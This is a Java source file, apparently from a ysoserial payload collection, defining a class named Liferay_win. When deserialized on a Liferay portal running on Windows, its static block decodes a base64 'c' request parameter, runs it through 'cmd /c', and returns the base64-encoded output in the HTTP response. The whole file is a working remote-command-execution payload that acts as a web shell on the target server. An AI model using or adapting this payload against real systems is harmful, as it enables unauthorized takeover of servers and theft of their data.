package ysoserial.payloads.external;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.bind.DatatypeConverter;
import java.io.InputStream;
import java.io.Serializable;
import java.util.Scanner;

import com.liferay.portal.kernel.security.access.control.AccessControlUtil;
import com.liferay.portal.kernel.security.auth.AccessControlContext;
import com.liferay.registry.BasicRegistryImpl;
import com.liferay.registry.RegistryUtil;


public class Liferay_win extends AbstractTranslet implements Serializable {
    private static final long serialVersionUID = -5971610431559700674L;

    static {
        try {
            RegistryUtil.setRegistry(new BasicRegistryImpl());
//            //  \lib\ext\portal-impl\com\liferay\portal\security\ac\AccessControlUtil.java
            AccessControlContext accessControlcontext = AccessControlUtil.getAccessControlContext();
//            // init request and response
            HttpServletRequest httprequest = accessControlcontext.getRequest();
            HttpServletResponse httpresponse = accessControlcontext.getResponse();


            // exexute shell to base64
            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getParameter("c")));
            // String params = httprequest.getParameter("c");
            String[] command = {"cmd", "/c", params};
            InputStream in = Runtime.getRuntime().exec(command).getInputStream();

            Scanner scan = new Scanner(in).useDelimiter("\\A");
            String d = scan.hasNext() ? scan.next() : "";

            // return command result to base64
            String base64Str = "";
            base64Str = DatatypeConverter.printBase64Binary(d.getBytes());
            httpresponse.getWriter().write(base64Str);

            // over http session
            httpresponse.getWriter().flush();
            httpresponse.getWriter().close();

        } catch (Exception e) {
            //  Block of code to handle errors
            e.getStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }


    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}
